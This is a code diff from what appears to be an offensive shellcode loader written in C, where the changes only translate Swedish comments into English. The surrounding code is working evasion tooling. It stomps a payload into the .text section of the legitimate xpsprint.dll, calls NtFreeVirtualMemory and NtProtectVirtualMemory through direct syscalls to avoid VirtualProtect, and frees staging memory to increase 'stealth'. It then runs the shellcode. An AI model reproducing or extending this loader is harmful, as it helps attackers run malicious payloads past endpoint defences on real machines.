@@ -209,8 +209,8 @@ Run()
 
     LPVOID pExecAddr = NULL;
 
-    // 1. Kör din nya stomping-funktion
-    // Den laddar modulen och hittar .text-sektionen åt dig
+    // 1. Execute stomping function
+    // It loads the module and locates the .text section
     if (!PerformModuleStomping(pAllocMem, payloadLen, &pExecAddr)) {
         DBG("[!] Module Stomping failed!");
         exit(1);
@@ -219,10 +219,10 @@ Run()
     DBG("[*] Payload stomped into legitim DLL at:");
 
 
-    SIZE_T freeSize = 0; // Vid MEM_RELEASE måste storleken vara 0
+    SIZE_T freeSize = 0; // For MEM_RELEASE, the size must be 0
     PrepareSyscall(_NtFreeVirtualMemory->syscallNumber, _NtFreeVirtualMemory->syscallInstructionAddress);
     
-    // Vi frigör det ursprungliga allokerade minnet (pAllocMem)
+    // Free the originally allocated memory (pAllocMem)
     ntStatus = Syscall_NtFreeVirtualMemory(
         GetCurrentProcess(),
         &pAllocMem,
@@ -232,21 +232,21 @@ Run()
 
     if (NT_SUCCESS(ntStatus)) {
         DBG("[*] Cleaned up temporary pAllocMem. Stealth increased!");
-        pAllocMem = NULL; // Nolla pekaren så vi inte råkar använda den igen
+        pAllocMem = NULL; // Nullify the pointer to prevent accidental reuse
     }
 
 
-    // 2. Ändra rättigheter med din SYSCALL (istället för VirtualProtect)
-    // Vi ändrar från Read/Write (som memcpy krävde) till Execute/Read
+    // 2. Change permissions using SYSCALL (instead of VirtualProtect)
+    // Change from Read/Write (required by memcpy) to Execute/Read
     DWORD dwOld;
     PrepareSyscall(_NtProtectVirtualMemory->syscallNumber, _NtProtectVirtualMemory->syscallInstructionAddress);
     
-    // Vi använder pExecAddr (adressen i xpsprint.dll) istället för pAllocMem
+    // Use pExecAddr (the address in xpsprint.dll) instead of pAllocMem
     ntStatus = Syscall_NtProtectVirtualMemory(
         GetCurrentProcess(), 
         &pExecAddr, 
         (SIZE_T*)&payloadLen, 
-        PAGE_EXECUTE_READ, // Vi behöver inte RWX, RX räcker och är säkrare!
+        PAGE_EXECUTE_READ, // Don't need RWX; RX is sufficient and more secure!
         &dwOld
     );
 
@@ -261,9 +261,9 @@ Run()
     DBG("[*] Protected stomped payload: RX");
 
     DBG("[*] Payload stomped into legitim DLL. PRESS ENTER TO RUN SHELLCODE...");
-    getchar(); // Väntar på att du trycker Enter i terminalen
+    getchar(); // Wait for the user to press Enter in the terminal
 
-    // 3. Kör koden lokalt
+    // 3. Execute the code locally
     ((VOID(*)())pExecAddr)();
 
 #endif
@@ -331,7 +331,7 @@ Run()
     ((VOID(*)())pAllocMem)();
     */
 
-    // 3. Kör koden lokalt
+    // 3. Execute the code locally
     //((VOID(*)())pExecAddr)();
 
 #endif
